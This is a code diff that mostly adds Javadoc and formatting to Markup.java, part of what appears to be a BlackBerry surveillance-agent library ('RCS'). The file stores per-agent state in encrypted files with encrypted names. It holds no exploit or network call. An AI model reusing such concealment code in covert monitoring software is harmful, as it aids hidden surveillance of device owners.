@@ -1,8 +1,8 @@
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSBlackBerry_lib 
- * File         : Markup.java 
+ * Project      : RCS, RCSBlackBerry_lib
+ * File         : Markup.java
  * Created      : 26-mar-2010
  * *************************************************/
 package blackberry.log;
@@ -21,7 +21,11 @@ import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
 
-public class Markup {
+// TODO: Auto-generated Javadoc
+/**
+ * The Class Markup.
+ */
+public final class Markup {
 
     public static final String MARKUP_EXTENSION = ".qmm";
 
@@ -34,6 +38,12 @@ public class Markup {
      * Override della funzione precedente: invece di generare il nome da una
      * stringa lo genera da un numero. Se la chiamata fallisce la funzione torna
      * una stringa vuota.
+     * 
+     * @param agentId
+     *            the agent id
+     * @param addPath
+     *            the add path
+     * @return the string
      */
     static String makeMarkupName(final int agentId, final boolean addPath) {
         // #ifdef DBC
@@ -41,7 +51,7 @@ public class Markup {
         // #endif
         final String logName = NumberUtilities.toString(agentId, 16, 4);
         // #debug debug
-	debug.trace("makeMarkupName from: " + logName);
+        debug.trace("makeMarkupName from: " + logName);
 
         final String markupName = makeMarkupName(logName, addPath, false);
         return markupName;
@@ -56,6 +66,14 @@ public class Markup {
      * tale file non sia gia' presente. Se il parametro facoltativo bStoreToMMC
      * e' impostato a TRUE viene generato un nome che punta alla prima MMC
      * disponibile, se esiste.
+     * 
+     * @param markupName
+     *            the markup name
+     * @param addPath
+     *            the add path
+     * @param storeToMMC
+     *            the store to mmc
+     * @return the string
      */
     static String makeMarkupName(final String markupName,
             final boolean addPath, final boolean storeToMMC) {
@@ -79,7 +97,7 @@ public class Markup {
         encName += Encryption.encryptName(markupName + MARKUP_EXTENSION, Keys
                 .getInstance().getChallengeKey()[0]);
         // #debug debug
-	debug.trace("makeMarkupName: " + encName);
+        debug.trace("makeMarkupName: " + encName);
 
         return encName;
     }
@@ -88,6 +106,9 @@ public class Markup {
      * Rimuove il file di markup relativo all'agente uAgentId. La funzione torna
      * TRUE se il file e' stato rimosso o non e' stato trovato, FALSE se non e'
      * stato possibile rimuoverlo.
+     * 
+     * @param agentId_
+     *            the agent id_
      */
 
     public static synchronized void removeMarkup(final int agentId_) {
@@ -152,6 +173,14 @@ public class Markup {
         encryption = new Encryption();
     }
 
+    /**
+     * Instantiates a new markup.
+     * 
+     * @param agentId_
+     *            the agent id_
+     * @param aesKey
+     *            the aes key
+     */
     public Markup(final int agentId_, final byte[] aesKey) {
         this();
         final byte[] key = new byte[16];
@@ -159,7 +188,7 @@ public class Markup {
 
         encryption.makeKey(key);
 
-        this.agentId = agentId_;
+        agentId = agentId_;
     }
 
     /**
@@ -171,6 +200,11 @@ public class Markup {
         return writeMarkup(null);
     }
 
+    /**
+     * Checks if is markup.
+     * 
+     * @return true, if is markup
+     */
     public synchronized boolean isMarkup() {
         // #ifdef DBC
         Check.requires(agentId > 0, "agentId null");
@@ -194,7 +228,9 @@ public class Markup {
      * vuoti, in questo caso non va usata la ReadMarkup() ma semplicemente la
      * IsMarkup() per vedere se e' presente o meno.
      * 
+     * @return the byte[]
      * @throws IOException
+     *             Signals that an I/O exception has occurred.
      */
     public synchronized byte[] readMarkup() throws IOException {
         // #ifdef DBC
@@ -223,11 +259,14 @@ public class Markup {
             return plain;
         } else {
             // #debug debug
-	debug.trace("Markup file does not exists");
+            debug.trace("Markup file does not exists");
             return null;
         }
     }
 
+    /**
+     * Removes the markup.
+     */
     public synchronized void removeMarkup() {
         // #ifdef DBC
         Check.requires(agentId > 0, "agentId null");
@@ -249,6 +288,10 @@ public class Markup {
      * WriteMarkup() comportera' la sovrascrittura del vecchio markup. La
      * funzione torna TRUE se e' andata a buon fine, FALSE altrimenti. Il
      * contenuto scritto e' cifrato.
+     * 
+     * @param data
+     *            the data
+     * @return true, if successful
      */
     public synchronized boolean writeMarkup(final byte[] data) {
         final String markupName = makeMarkupName(agentId, true);
